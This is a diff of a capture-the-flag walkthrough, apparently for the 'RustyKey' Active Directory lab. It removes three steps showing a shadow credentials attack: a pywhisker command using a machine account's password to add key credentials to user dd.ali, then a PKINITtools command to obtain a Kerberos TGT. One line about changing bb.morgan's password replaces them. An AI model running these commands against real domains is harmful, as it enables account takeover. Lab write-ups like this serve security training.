@@ -91,17 +91,7 @@
 
 ![image](https://github.com/user-attachments/assets/bc7eb631-1379-4863-89ff-9d9dc105ffdf)
 
-15. Using IT-Computer3$, which has GenericWrite on dd.ali, do shadow credential attack using pywhisker script
-
-![image](https://github.com/user-attachments/assets/990c4f98-5ab8-4583-980c-9e4094380a24)
-
-16. Doesn't work initially, so look at pywhisker.py source code and debug/troubleshoot. Then try again and success!
-
-`sudo python3 /opt/pywhisker/pywhisker/pywhisker.py --dc-ip dc.rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k --target "dd.ali" --action "add" -f dd.ali -p Password123 -d rustykey.htb`
-
-17. Using shadow credential, attempt to get TGT as dd.ali user
-
-`sudo python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx dd.ali.pfx -pfx-pass Password123 rustykey.htb/dd.ali dd.ali.ccache -dc-ip 10.129.244.92`
+15. Using IT-Computer3$, change bb.morgan's password.
 
 
 
